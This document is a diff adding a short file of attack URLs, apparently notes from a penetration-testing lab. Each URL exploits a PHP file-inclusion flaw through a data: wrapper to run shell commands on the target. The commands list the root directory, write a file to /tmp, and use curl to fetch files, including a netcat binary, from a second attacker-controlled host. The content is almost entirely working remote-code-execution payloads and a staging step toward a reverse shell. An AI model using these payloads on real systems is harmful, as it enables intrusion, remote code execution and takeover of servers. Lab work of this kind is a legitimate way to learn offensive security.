@@ -1,0 +1,7 @@
+http://10.11.1.35/section.php?page=data:text/plain,%3C?php%20echo%20shell_exec(%22ls%20-la%20\/%22)%20?%3E
+http://10.11.1.35/section.php?page=data:text/plain,%3C?php%20echo%20shell_exec(%22echo%20hello%20%3E%20\/tmp\/helloworld.txt%22)%20?%3E
+
+
+http://10.11.1.35/section.php?page=data:text/plain,%3C?php%20echo%20shell_exec(%22curl%20192.168.45.208%20--output%20\/tmp\/curl.txt%22)%20?%3E
+
+http://10.11.1.35/section.php?page=data:text/plain,%3C?php%20echo%20shell_exec(%22curl%20192.168.45.208/nc%20--output%20\/tmp\/nc%22)%20?%3E
